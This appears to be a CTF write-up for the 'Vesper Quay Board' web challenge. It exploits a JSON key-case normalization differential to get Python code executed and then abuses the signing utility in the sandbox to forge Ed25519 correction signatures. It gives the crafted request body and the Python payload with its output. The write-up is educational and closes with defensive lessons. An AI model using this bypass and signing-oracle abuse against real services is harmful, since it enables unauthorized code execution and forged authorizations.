# CSCTF 2026 — Vesper Quay Board Writeup

**08/11/2026**

---

> **CTF:** CSCTF 2026  
>  **Challenge:** Vesper Quay Board  
>  **Category:** Web  
>  **Author:** Mohamed Amine Mzoughi  
>  **Team:** XREFctf  
>  **Writeup Author:** Mahmoud Adel

## Introduction

Hey everyone! My name is **Mahmoud Adel** — a cybersecurity enthusiast passionate about red teaming and CTFs. Today I’m walking through how I solved the **Vesper Quay Board** web challenge from **CSCTF 2026**.

The challenge presented a duty desk API for a fictional “Vesper Quay Board”. The briefing mentioned that a release warrant was forged and approved under a sealed courier, but the quay logged a different courier. The goal was to file a correction signed by a release that the quay actually runs, and retrieve a verification clearance code (the flag).

The API reference was available at `/v1/openapi.json`. From the description, I understood that the desk and the quay parse the same JSON body but have different validation rules:

- The **desk** accepts only an approved courier and an empty `argv` or a single `status` item.
- The **quay** reads exact keys `courier` and `argv`, and runs `python3 -I` with the provided `argv` only when the desk courier is the approved one and the quay courier is the legacy one.
- The `argv` must be exactly two strings whose first item is `-c`.
- The child process environment contains `STATION_SIGN` and other variables.
- Corrections are Ed25519 signatures over RFC 8785 canonical JSON of `applied_primary`, `courier_id`, `quay_id`, `submission_id`, and `warrant_id`, formatted in standard Base64.

Let’s get right into it!

---

## Initial Reconnaissance

I started by fetching the OpenAPI specification and the current warrant state:

```http
GET /v1/warrants/current HTTP/1.1
```

Response:

```json
{
  "approved_courier": "c-7ff355",
  "fingerprint": "b7d80d9b796954c0",
  "lane": "south-cut",
  "legacy_courier": "c-a22b61",
  "quay_id": "QY-A983",
  "summary": "The desk accepted the sealed courier. The quay record names the other courier. The raw warrant was not kept.",
  "warrant_id": "WR-77AE"
}
```

This confirmed the state:

- The approved courier expected by the desk was `c-7ff355`.
- The legacy courier expected by the quay was `c-a22b61`.

The quay executes code only if it observes the legacy courier accompanied by a two-element `argv` starting with `-c`. The desk, conversely, accepts only the approved courier with `argv` matching `[]` or `["status"]`.

---

## Investigation and Exploitation

### First attempt: duplicate JSON keys

My initial hypothesis was to leverage duplicate JSON keys. Many JSON parsers resolve duplicate keys by overwriting earlier occurrences with the last value, while others preserve the first. If the desk and the quay parsed duplicate keys differently, I could send duplicate pairs of `courier` and `argv`: one set for the desk (approved \+ `["status"]`) and one set for the quay (legacy \+ `["-c", payload]`).

I tested this by sending a `POST` request to `/v1/warrants` with duplicate keys in both orders:

```json
{
  "courier": "c-7ff355",
  "argv": ["status"],
  "courier": "c-a22b61",
  "argv": ["-c", "..."]
}
```

The response showed that both the desk and the quay parsed the body identically; both components observed the same courier and `argv`, and the loader was ignored. No duplicate-key parser differential was present.

### Second attempt: key normalization differential

The briefing emphasized: *“The quay reads the exact keys `courier` and `argv`.”* That specific phrasing suggested the quay enforced strict lowercase key matching, while the desk might be lenient or apply key normalization (such as case-folding).

I crafted a payload where:

- The exact lowercase keys `"courier"` and `"argv"` held the legacy courier and malicious execution arguments for the quay.
- Variant keys `"Courier"` and `"Argv"` held the approved courier and `["status"]` for the desk.

```json
{
  "courier": "c-a22b61",
  "argv": ["-c", "<python payload>"],
  "Courier": "c-7ff355",
  "Argv": ["status"]
}
```

I submitted this to `/v1/warrants`:

```http
POST /v1/warrants HTTP/1.1
Content-Type: application/json
```

The response confirmed the parser differential:

```json
{
  "preview": {
    "argv": ["status"],
    "courier": "c-7ff355",
    "loader": "primary"
  },
  "quay": {
    "argv_ignored": false,
    "courier": "c-a22b61",
    "desk_courier": "c-7ff355",
    "loader": "primary",
    "loader_exit": 0,
    "loader_status": "ok",
    "loader_stderr": "",
    "loader_stdout": "RESULT{...}"
  },
  "submission_id": "sub-..."
}
```

The desk normalized `"Courier"` and `"Argv"`, observing `c-7ff355` and `["status"]`, thus accepting the warrant. Simultaneously, the quay read the strict lowercase keys `"courier"` and `"argv"`, observing `c-a22b61` and our `["-c", payload]`, and executed the Python payload (`loader_status: "ok"`).

### The payload

The Python payload inspected the environment variables supplied to the execution sandbox, specifically `STATION_SIGN`. It assembled the RFC 8785 canonical JSON for the correction, signed it for both boolean values of `applied_primary` (`false` and `true`), and printed the results.

```python
import os, json, subprocess, base64, shlex
E = os.environ

def sign(ap):
    o = {
        "applied_primary": ap,
        "courier_id": E["COURIER_ID"],
        "quay_id": E["QUAY_ID"],
        "submission_id": E["SUBMISSION_ID"],
        "warrant_id": E["WARRANT_ID"],
    }
    c = json.dumps(o, sort_keys=True, separators=(",", ":"), ensure_ascii=False).encode()
    cmd = shlex.split(E["STATION_SIGN"])
    s = subprocess.check_output(cmd, input=c)
    if len(s) == 65 and s[-1:] == b"\n":
        s = s[:-1]
    if len(s) == 64:
        return base64.b64encode(s).decode()
    return s.decode().strip()

out = {"env": {k: E.get(k) for k in ["STATION_KEY","EDGE_URL","SUBMISSION_ID","QUAY_ID","WARRANT_ID","COURIER_ID","STATION_SIGN"]}}
for ap in (False, True):
    out["true" if ap else "false"] = sign(ap)
print("RESULT" + json.dumps(out))
```

The output in `loader_stdout` revealed the sandbox environment and the generated Base64 Ed25519 signatures:

```json
{
  "env": {
    "STATION_KEY": "/tmp/station.key",
    "EDGE_URL": "http://127.0.0.1:8080",
    "SUBMISSION_ID": "sub-c6c7e071cdc16270cba7bb8234c2b6c3",
    "QUAY_ID": "QY-A983",
    "WARRANT_ID": "WR-77AE",
    "COURIER_ID": "c-a22b61",
    "STATION_SIGN": "/usr/local/bin/station-sign"
  },
  "false": "SVl26/oVjNUpJtuYe03zX6JMKCNKTUjyAOQQc3V+qi4m2zXG6Pk22vO/ivArS2yzY/cDYE6XkBoeICAgO1z2DQ==",
  "true": "uwFxxvvmil4fedIVFNv0669kZZbhC7cVD0hdFtEwQtqOnbMebWkrbYZgwCWCuCSKXpxRdmQztnhonERPXPjICw=="
}
```

### Filing the correction

With valid station signatures generated directly by the quay’s signing utility, I submitted a correction to `/v1/corrections`. The accepted structure was a flat JSON object with the canonical fields plus `signature`, with `applied_primary` set to `false`:

```json
{
  "applied_primary": false,
  "courier_id": "c-a22b61",
  "quay_id": "QY-A983",
  "submission_id": "sub-c6c7e071cdc16270cba7bb8234c2b6c3",
  "warrant_id": "WR-77AE",
  "signature": "SVl26/oVjNUpJtuYe03zX6JMKCNKTUjyAOQQc3V+qi4m2zXG6Pk22vO/ivArS2yzY/cDYE6XkBoeICAgO1z2DQ=="
}
```

The endpoint responded with HTTP `200 OK` and returned the clearance code containing the flag.

---

## Root Cause \& Technical Explanation

The vulnerability stemmed from a **JSON key normalization differential** across service components:

- The **desk** component parsed or normalized JSON keys case-insensitively, conflating `"Courier"` with `"courier"` and `"Argv"` with `"argv"`.
- The **quay** component strictly accessed exact lowercase `"courier"` and `"argv"` properties.

By supplying both variations in the same JSON object, the attacker could satisfy the desk’s validation rules while passing arbitrary code execution parameters directly to the quay’s execution runner.

Furthermore, once inside the quay execution sandbox, access to the binary pointed to by `STATION_SIGN` allowed arbitrary canonical JSON payloads to be signed using the quay’s private station key, enabling the creation of valid warrant corrections.

---

## Final Result \& Flag

Submitting the signed correction to `/v1/corrections` returned the clearance verification code:

```text
CSCTF{<REDACTED>}
```

The flag format was confirmed against competition requirements. *(Note: The live flag string has been redacted per competition rules).*

---

## Conclusion \& Key Takeaways

1. **Parser differentials break authorization boundaries:** When two distinct backend services or microservices parse the same client input, differences in key casing, normalization, or duplicate key handling lead directly to authorization bypasses.
2. **Standardize parsing across architectural layers:** All components evaluating an input document must adhere to the same schema and strict parsing rules (e.g., rejecting unexpected keys or case variants).
3. **Sandbox privilege containment:** Utilities with access to private signing keys (`STATION_SIGN`) must not be accessible or invokable by child execution environments with untrusted code.

---

## AI Methodology

During this challenge, I used an AI assistant for:

- Analyzing the OpenAPI schema specifications and discussing differential JSON parsing vectors.
- Brainstorming key normalization techniques between the desk and quay engines.
- Structuring the Python signing helper script for RFC 8785 canonical serialization.

All exploit steps, requests, and payload executions were run manually against the target challenge instance from my workstation, and all outputs and clearance responses were inspected and verified directly.

*No live flags, credentials, tokens, or instance URLs are included in this writeup.*

---

*Thanks for reading — hope this writeup helped someone learn something new. Happy hacking!*

[This post](https://m2hmoud2del.github.io/posts/csctf-2026-vesper-quay-board/) is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) by the author.
